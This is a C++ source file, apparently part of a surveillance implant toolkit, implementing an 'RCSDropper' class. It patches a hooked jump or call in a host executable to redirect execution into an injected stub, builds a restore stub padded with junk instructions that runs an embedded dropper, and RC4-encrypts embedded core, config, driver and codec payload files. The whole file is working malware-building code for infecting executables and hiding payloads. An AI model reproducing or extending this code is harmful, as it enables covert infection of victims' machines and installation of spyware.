/*
 * RCSDropper.cpp
 *
 *  Created on: May 11, 2010
 *      Author: daniele
 */

#include "RCSDropper.h"
#include "../../RCSDropper/DropperHeader.h"


#include <algorithm>
#include <iomanip>
#include <iostream>
using namespace std;

#include <boost/algorithm/string.hpp>
#include <boost/filesystem/fstream.hpp>
#include <boost/filesystem.hpp>
#include <boost/format.hpp>
#include <boost/random.hpp>
#include <boost/regex.hpp>
#include <boost/shared_array.hpp>

#include <AsmJit.h>

#include "Common.h"
#include "CookerVersion.h"
//#include "DropperHeader.h"
#include "hook.h"

static void rc4crypt(
        const unsigned char *key,
        size_t keylen,
        unsigned char *data,
        size_t data_len);

void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD stubVA)
{
    (void) VA;
    
    AsmJit::Assembler stub;
    
    switch (hookedInstruction_.d.Instruction.BranchType) {
        case JmpType:
        {
	    if (hookedInstruction_.len == 5)
	    {
		DWORD codeVA = stubVA + sizeof(DWORD);
		DWORD addr = (DWORD) ptr + codeVA - (DWORD)hookedInstruction_.d.VirtualAddr;
	        std::cout << "Stage1 stub: jmp 0x" << hex << codeVA << dec << std::endl;
		stub.call( (void*) (addr + 0x1000));
	    }
	    else if (hookedInstruction_.len == 6)
            {
                cout << "Stage1 stub: jmp dword ptr ds:[0x" << hex << stubVA << "]" << dec << std::endl;
		stub.call(AsmJit::dword_ptr_abs((void*)stubVA));
            }
        }
        break;
        case CallType:
        {
            if (hookedInstruction_.len == 5)
	    {
	            // account for initial 4 bytes containing address of next byte
        	    DWORD codeVA = stubVA + sizeof(DWORD);
	            DWORD addr = (DWORD) ptr + codeVA - (DWORD)hookedInstruction_.d.VirtualAddr;
	            std::cout << "Stage1 stub: call 0x" << hex << codeVA << dec << std::endl;
	            stub.call( (void*) (addr + 0x1000));
	    }
	    else if (hookedInstruction_.len == 6)
	    {
 	           cout << "Stage1 stub: call dword ptr ds:[0x" << hex << stubVA << "]" << dec << std::endl;
        	   stub.call(AsmJit::dword_ptr_abs( (void*)stubVA ));
	    }
        }
        break;
    }
    
    // save original code
    DataSectionHeader* h = header();
    h->stage1.VA = hookedInstruction_.d.VirtualAddr;
    h->stage1.size = stub.codeSize();
    h->stage1.offset = offset_.stage1 - offset_.header; // offsets are header based here
    memcpy( ptr_( offset_.stage1 ), ptr, h->stage1.size);
    
    stub.relocCode((void*) ptr);
}

// XXX need of calling for size of stub makes restoreStub messy ... refactor!!

std::size_t RCSDropper::restoreStub(DWORD currentVA) {
    unsigned char* restore = ptr_(offset_.restore);
    DataSectionHeader* h = NULL;
    DWORD headerVA, dropperVA, stage1VA;
    
    if (currentVA == 0) {
        headerVA = 0xFFFFFFFF;
        dropperVA = 0xFFFFFFFF;
        stage1VA = 0xFFFFFFFF;
    } else {
        h = header();
        headerVA = currentVA + offset_.header;
        dropperVA = headerVA + sizeof (DataSectionHeader) + 8;
        stage1VA = h->stage1.VA;

        DEBUG_MSG(D_VERBOSE, "Current  VA : %08x", currentVA);
        DEBUG_MSG(D_VERBOSE, "Header   VA : %08x", headerVA);
        DEBUG_MSG(D_VERBOSE, "Dropper  VA : %08x", dropperVA);
        DEBUG_MSG(D_VERBOSE, "Stage1   VA : %08x", stage1VA);
        printf("Current  VA : %08x\n", currentVA);
        printf("Header   VA : %08x\n", headerVA);
        printf("Dropper  VA : %08x\n", dropperVA);
        printf("Stage1   VA : %08x\n", stage1VA);
	printf("Restore  VA : %08x\n", restore);
    }

    DWORD restoreVA = currentVA + sizeof(DWORD);
    
    AsmJit::Assembler stub;
    AsmJit::Label *start_loop = stub.newLabel();
    stub.data(&restoreVA, sizeof(DWORD));
    for (unsigned int i=0; i<0x1000; i++)
    	    stub.nop();
/*
    stub.pushfd();
    stub.nop();
    stub.pushad();
    stub.nop();

//    stub.push(headerVA);
//    stub.pop(AsmJit::eax);
//stub.bind(start_loop);
//    stub.inc(AsmJit::eax);
//    stub.mov(AsmJit::ebx, AsmJit::dword_ptr(AsmJit::eax));
//    stub.inc(AsmJit::ebx);
//    stub.cmp(AsmJit::ebx, 0x2e312e32);
//    stub.jne(start_loop);
//    stub.push(AsmJit::eax);


    stub.nop();
    stub.call(((DWORD) restore) + (dropperVA - currentVA));
    //stub.call(dropperVA - dropperVA);
    stub.nop();
    stub.popad();
    stub.nop();
    stub.sub( AsmJit::dword_ptr(AsmJit::esp, 4), hookedInstruction_.len );
    stub.nop();
    stub.popfd();
    stub.nop();
    stub.ret();
*/
    stub.push(AsmJit::eax);					// nop
    stub.pop(AsmJit::eax);					// nop
    stub.pushfd(); // restoreVA starts here
    stub.mov(AsmJit::eax, AsmJit::eax);		// nop
    stub.pushad();
    stub.push(1);							// nop
    stub.add(AsmJit::esp, 4);				// nop

    // save last_error
    stub.mov(AsmJit::eax, dword_ptr_abs(0, 0x18, AsmJit::SEGMENT_FS));
    stub.xchg(AsmJit::ebx, AsmJit::eax);		// nop
    stub.xchg(AsmJit::ebx, AsmJit::eax);		// nop
    stub.mov(AsmJit::eax, dword_ptr(AsmJit::eax, 0x34));
    stub.push(AsmJit::eax);

    //stub.call( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (epVA - stubVA) );
    stub.call( ((DWORD) restore) + (dropperVA - currentVA) );

    // restore last_error
    stub.push(AsmJit::eax);					// nop
    stub.pop(AsmJit::eax);					// nop
    stub.mov(AsmJit::eax, dword_ptr_abs(0, 0x18, AsmJit::SEGMENT_FS));
    stub.mov(AsmJit::eax, AsmJit::eax);		// nop
    stub.pop(AsmJit::ebx);
    stub.push(1);							// nop
    stub.add(AsmJit::esp, 4);				// nop
    stub.mov(dword_ptr(AsmJit::eax, 0x34), AsmJit::ebx);
    stub.xchg(AsmJit::ebx, AsmJit::eax);		// nop
    stub.xchg(AsmJit::ebx, AsmJit::eax);		// nop
    stub.popad();
    stub.push(AsmJit::eax);					// nop
    stub.pop(AsmJit::eax);					// nop

    // substract from retaddr before restoring flags
    stub.sub( AsmJit::dword_ptr(AsmJit::esp, 4), hookedInstruction_.len );
    stub.add(AsmJit::eax, 0);
    stub.popfd();
    stub.nop();
    stub.ret();
    
    stub.relocCode((void*) restore);

    if (currentVA == 0)
	return stub.codeSize() + 3;

    return stub.codeSize();
}

void RCSDropper::loadFile(bf::path filePath) {
    std::size_t fileSize = bf::file_size(filePath);
    char* data = (char*) ptr_(offset_.header);

    bf::ifstream rcs_file(filePath, ios::in | ios::binary);
    rcs_file.read(data, fileSize);
    rcs_file.close();
}

void RCSDropper::generateKey() {
    // TODO generate RC4 key
    boost::mt19937 rng(static_cast<unsigned int> (std::time(0)));
    boost::uniform_smallint<> uni_dist(0, 255);
    boost::variate_generator<boost::mt19937&, boost::uniform_smallint<> > uni(rng, uni_dist);

    DataSectionHeader* h = header();
    for (int i = 0; i < RC4KEYLEN; ++i)
        h->rc4key[i] = static_cast<unsigned short int> (uni());

    std::ostringstream skey;
    for (int i = 0; i < RC4KEYLEN; ++i)
        skey << hex << static_cast<unsigned short int> (h->rc4key[i]);
    //DEBUG_MSG(D_EXCESSIVE, "RC4 Key : %s", skey.str().c_str());
}

void RCSDropper::encrypt() {
    DataSectionHeader* h = header();

    // TODO encrypt files
    DEBUG_MSG(D_DEBUG, "Encrypting core           ... %d", (DWORD) h->files.core.size);
    encryptFile_(h->files.core);

    DEBUG_MSG(D_DEBUG, "Encrypting core (64bit)   ... %d", (DWORD) h->files.core64.size);
    encryptFile_(h->files.core64);

    DEBUG_MSG(D_DEBUG, "Encrypting config         ... %d", (DWORD) h->files.config.size);
    encryptFile_(h->files.config);

    DEBUG_MSG(D_DEBUG, "Encrypting driver         ... %d", (DWORD) h->files.driver.size);
    encryptFile_(h->files.driver);

    DEBUG_MSG(D_DEBUG, "Encrypting driver (64bit) ... %d", (DWORD) h->files.driver64.size);
    encryptFile_(h->files.driver64);

    DEBUG_MSG(D_DEBUG, "Encrypting codec          ... %d", (DWORD) h->files.codec.size);
    encryptFile_(h->files.codec);
}

void RCSDropper::encryptFile_(DataSectionCryptoPack& file) {
    if (file.size != 0) {
        DataSectionHeader* h = header();
        rc4crypt(
                (unsigned char*) h->rc4key,
                RC4KEYLEN,
                (unsigned char*) h + file.offset,
                file.size
                );
    }
}

RCSDropper::RCSDropper(const char* filepath) {
    // calculate final size
    bf::path p = filepath;

    if (!bf::exists(p))
        throw std::runtime_error(filepath);

    std::size_t fileSize = bf::file_size(filepath);
    //size_ = fileSize + 8192;
    size_ = fileSize + 16384;

    // create buffer and zero it out
    data_.insert(data_.begin(), size_, 0);

    // calculate all offsets
    offset_.restore = 0;

    offset_.header = std::max<std::size_t > (restoreStub(0), 32);
    DEBUG_MSG(D_DEBUG, "Size of restore stub: %d", offset_.header);
    // XXX magic number!
    DEBUG_MSG(D_DEBUG, "Offset to header:     %d", offset_.header);
    offset_.stage1 = offset_.header + fileSize;

    loadFile(filepath);

    if (verifyCookerVersion() == false) {
        std::string version = header()->version;
        if (version.empty())
            version = "<unknown>";
        throw InvalidCookerVersion(version, printable_required_cooker_version);
    }

    //generateKey();
    //encrypt();
}

bool RCSDropper::verifyCookerVersion() {
    DataSectionHeader* h = header();
    std::string version = h->version;
    boost::trim_left(version);
    boost::trim_right(version);

    DEBUG_MSG(D_INFO, "Dropper built with cooker version: %s", version.c_str());

    try {

        if (boost::regex_match(version, required_cooker_version))
            return true;

    } catch (boost::regex_error& e) {
        DEBUG_MSG(D_DEBUG, "Found version: %s", version.c_str());
        DEBUG_MSG(D_WARNING, "Required cooker version is not a valid regular expression: %d", e.what());
        return false;
    } catch (...) {
        return false;
    }

    DEBUG_MSG(D_ERROR, "Dropper built with an invalid cooker version, found %s required %s",
            version.c_str(),
            printable_required_cooker_version.c_str());

    return false;
}

RCSDropper::~RCSDropper() {
    // TODO Auto-generated destructor stub
}

#define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0);
void rc4crypt(const unsigned char *key, size_t keylen,
        unsigned char *data, size_t data_len) {
    unsigned int i, j, k;
    unsigned char *pos;
    unsigned char S[256];
    size_t kpos;
    size_t skip = 0;

    /* Setup RC4 state */
    for (i = 0; i < 256; i++)
        S[i] = i;
    j = 0;
    kpos = 0;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[kpos]) & 0xff;
        kpos++;
        if (kpos >= keylen)
            kpos = 0;
        S_SWAP(i, j);
    }

    /* Skip the start of the stream */
    i = j = 0;
    for (k = 0; k < skip; k++) {
        i = (i + 1) & 0xff;
        j = (j + S[i]) & 0xff;
        S_SWAP(i, j);
    }

    /* Apply RC4 to data */
    pos = data;
    for (k = 0; k < data_len; k++) {
        i = (i + 1) & 0xff;
        j = (j + S[i]) & 0xff;
        S_SWAP(i, j);
        *pos++ ^= S[(S[i] + S[j]) & 0xff];
    }
}
